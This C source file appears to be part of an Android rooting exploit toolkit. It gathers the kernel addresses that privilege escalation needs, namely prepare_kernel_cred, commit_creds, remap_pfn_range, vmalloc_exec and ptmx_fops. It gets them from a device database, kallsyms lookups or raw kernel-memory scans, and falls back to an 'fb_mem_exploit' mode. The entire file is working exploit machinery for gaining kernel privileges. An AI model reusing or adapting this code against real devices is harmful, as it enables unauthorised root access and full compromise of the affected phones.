#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <sys/system_properties.h>
#include "device_database.h"
#include "cred.h"
#include "mm.h"
#include "ptmx.h"
#include "libexploit/exploit.h"
#include "libkallsyms/kallsyms_in_memory.h"

static void *vmalloc_exec;

static bool
has_all_essential_addresses(void)
{
  if (prepare_kernel_cred
   && commit_creds
   && remap_pfn_range
   && vmalloc_exec
   && ptmx_fops) {
    return true;
  }

  return false;
}

bool
setup_vmalloc_exec_address(void)
{
  if (vmalloc_exec) {
    return true;
  }

  vmalloc_exec = (void *)device_get_symbol_address(DEVICE_SYMBOL(vmalloc_exec));

  if (!vmalloc_exec && kallsyms_exist()) {
    vmalloc_exec = (void *)kallsyms_get_symbol_address("vmalloc_exec");
  }

  return !!vmalloc_exec;
}

static bool
find_ptmx_fops_address(kallsyms *info, void *mem, size_t length)
{
  find_ptmx_fops_hint_t hint;

  hint.ptmx_open_address = kallsyms_in_memory_lookup_name(info, "ptmx_open");
  if (!hint.ptmx_open_address) {
    return false;
  }

  hint.tty_release_address = kallsyms_in_memory_lookup_name(info, "tty_release");
  if (!hint.tty_release_address) {
    return false;
  }

  hint.tty_fasync_address = kallsyms_in_memory_lookup_name(info, "tty_fasync");
  if (!hint.tty_fasync_address) {
    return false;
  }

  return setup_ptmx_fops_address_in_memory(mem, length, &hint);
}

static bool
find_variables_in_memory(void *mem, size_t length)
{
  kallsyms *info;

  printf("Search address in memory...\n");

  info = kallsyms_in_memory_init(mem, length);
  if (info) {
    printf("Using kallsyms_in_memory...\n");

    if (!prepare_kernel_cred) {
      prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_in_memory_lookup_name(info, "prepare_kernel_cred");
    }

    if (!commit_creds) {
      commit_creds = (commit_creds_t)kallsyms_in_memory_lookup_name(info, "commit_creds");
    }

    if (!remap_pfn_range) {
      remap_pfn_range = (void *)kallsyms_in_memory_lookup_name(info, "remap_pfn_range");
    }

    if (!vmalloc_exec) {
      vmalloc_exec = (void *)kallsyms_in_memory_lookup_name(info, "vmalloc_exec");
    }

    if (!ptmx_fops) {
      ptmx_fops = (void *)kallsyms_in_memory_lookup_name(info, "ptmx_fops");

      if (!ptmx_fops) {
        find_ptmx_fops_address(info, mem, length);
      }
    }

    kallsyms_in_memory_free(info);

    if (has_all_essential_addresses()) {
      return true;
    }
  }

  setup_prepare_kernel_cred_address_in_memory(mem, length);
  setup_commit_creds_address_in_memory(mem, length);

  return has_all_essential_addresses();
}

static bool
setup_variables(void)
{
  setup_prepare_kernel_cred_address();
  setup_commit_creds_address();
  setup_remap_pfn_range_address();
  setup_vmalloc_exec_address();
  setup_ptmx_fops_address();

  if (has_all_essential_addresses()) {
    return true;
  }

  printf("Try to find address in memory...\n");
  if (!run_with_mmap(find_variables_in_memory)) {
    printf("\n");
    run_with_memcpy(find_variables_in_memory);
  }

  if (has_all_essential_addresses()) {
    return true;
  }

  if (!prepare_kernel_cred) {
    printf("Failed to get prepare_kernel_cred address.\n");
  }

  if (!commit_creds) {
    printf("Failed to get commit_creds address.\n");
  }

  if (!remap_pfn_range) {
    printf("Failed to get remap_pfn_range address.\n");
  }

  if (!vmalloc_exec) {
    printf("Failed to get vmalloc_exec address.\n");
  }

  if (!ptmx_fops) {
    printf("Failed to get ptmx_fops address.\n");
  }

  return false;
}

static void
register_address(void)
{
#ifdef HAS_SET_SYMBOL_ADDRESS
  printf("Essential address are:\n");

  if (device_set_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred), (unsigned long int)prepare_kernel_cred)) {
    printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred);
  }

  if (device_set_symbol_address(DEVICE_SYMBOL(commit_creds), (unsigned long int)commit_creds)) {
    printf("  commit_creds = %p\n", commit_creds);
  }

  if (device_set_symbol_address(DEVICE_SYMBOL(remap_pfn_range), (unsigned long int)remap_pfn_range)) {
    printf("  remap_pfn_range = %p\n", remap_pfn_range);
  }

  if (device_set_symbol_address(DEVICE_SYMBOL(vmalloc_exec), (unsigned long int)vmalloc_exec)) {
    printf("  vmalloc_exec = %p\n", vmalloc_exec);
  }

  if (device_set_symbol_address(DEVICE_SYMBOL(ptmx_fops), (unsigned long int)ptmx_fops)) {
    printf("  ptmx_fops = %p\n", ptmx_fops);
  }
#endif /* HAS_SET_SYMBOL_ADDRESS */
}

bool
get_address(void)
{
  printf("Try without fb_mem_exploit fist...\n\n");
  set_fb_mem_exploit_enable(false);

  if (!setup_variables()) {
    printf("\n\n");

    printf("Try again with fb_mem_exploit...\n\n");
    set_fb_mem_exploit_enable(true);
    if (!setup_variables()) {
      printf("Failed to setup variables.\n");
      return false;
    }
  }

  register_address();

  return true;
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/

